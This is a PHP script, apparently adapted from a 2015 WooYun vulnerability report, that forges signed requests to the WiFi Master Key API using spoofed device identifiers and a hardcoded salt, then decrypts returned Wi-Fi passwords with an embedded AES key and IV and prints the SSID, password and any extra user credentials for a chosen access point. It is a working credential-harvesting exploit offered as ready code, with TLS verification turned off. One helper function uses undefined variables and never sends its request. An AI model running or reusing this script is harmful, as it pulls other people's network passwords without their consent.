<?php
//some code from http://www.wooyun.org/bugs/wooyun-2015-099268
$bssid = "c8:3a:35:fa:b8:80";
$ssid = "Podinns2F03";

//update salt
$ret = request($bssid, $ssid, md5(rand(1, 10000)));
$ret = json_decode($ret);

$ret = request($bssid, $ssid, $ret->retSn);
$ret = json_decode($ret);
if($ret->retCd == 0){
	if($ret->qryapwd->retCd == 0){
		$list = $ret->qryapwd->psws;
		foreach($list as $wifi){
			echo 'SSID: '.$wifi->ssid."\n";
			echo 'PWD: '.decryptStrin($wifi->pwd)."\n";
			echo 'BSSID: '.$wifi->bssid."\n";
			if($wifi->xUser){
				echo 'xUser: '.$wifi->xUser."\n";
				echo 'xPwd: '.$wifi->xPwd."\n";
			}
		}
	}
	else{
		echo $ret->qryapwd->retMsg;
	}
}

function request($bssid, $ssid, $salt, $dhid = 'ff8080814cc5798a014ccbbdfa375369'){
	$data = array();
	$data['appid'] = '0008';
	$data['bssid'] = $bssid;
	$data['chanid'] = 'gw';
	$data['dhid'] = $dhid;
	$data['ii'] = '609537f302fc6c32907a935fb4bf7ac9';
	$data['lang'] = 'cn';
	$data['mac'] = '60f81dad28de';
	$data['method'] = 'getDeepSecChkSwitch';
	$data['pid'] = 'qryapwd:commonswitch';
	$data['ssid'] = $ssid;
	$data['st'] = 'm';
	$data['uhid'] = 'a0000000000000000000000000000001';
	$data['v'] = '324';
	$data['sign'] = sign($data, $salt);

	$curl = curl_init();
	curl_setopt($curl, CURLOPT_URL, 'http://wifiapi02.51y5.net/wifiapi/fa.cmd');
	curl_setopt($curl, CURLOPT_USERAGENT,'WiFiMasterKey/1.1.0 (Mac OS X Version 10.10.3 (Build 14D136))');
	curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false); // stop verifying certificate
	curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
	curl_setopt($curl, CURLOPT_POST, true); // enable posting
	curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($data)); // post images 
	curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true); // if any redirection after upload
	$r = curl_exec($curl); 
	curl_close($curl);
	return $r;
}

function registerNewDevice(){
	$salt = '1Hf%5Yh&7Og$1Wh!6Vr&7Rs!3Nj#1Aa$';

	$data = array();
	$data['appid'] = '0008';
	$data['bssid'] = $bssid;
	$data['chanid'] = 'gw';
	$data['dhid'] = $dhid;
	$data['ii'] = '609537f302fc6c32907a935fb4bf7ac9';
	$data['lang'] = 'cn';
	$data['mac'] = '60f81dad28de';
	$data['method'] = 'getDeepSecChkSwitch';
	$data['pid'] = 'qryapwd:commonswitch';
	$data['ssid'] = $ssid;
	$data['st'] = 'm';
	$data['uhid'] = 'a0000000000000000000000000000001';
	$data['v'] = '324';
	$data['sign'] = sign($data, $salt);
}

function sign( $array , $salt ){
	// 签名算法
	$request_str = '';
	// 对应apk中的 Arrays.sort 数组排序，测试PHP需用 ksort 
	ksort( $array );
	foreach ($array as $key => $value) {
		$request_str .= $value;
	}
	$sign = md5( $request_str . $salt );
	return strtoupper($sign);
}

function decryptStrin($str,$keys='k%7Ve#8Ie!5Fb&8E',$iv='y!0Oe#2Wj#6Pw!3V',$cipher_alg=MCRYPT_RIJNDAEL_128){
    //Wi-Fi万能钥匙密码采用 AES/CBC/NoPadding 方式加密
    //[length][password][timestamp]
    $decrypted_string = mcrypt_decrypt($cipher_alg, $keys, pack("H*",$str),MCRYPT_MODE_CBC, $iv);
    return substr(trim($decrypted_string),3,-13);
}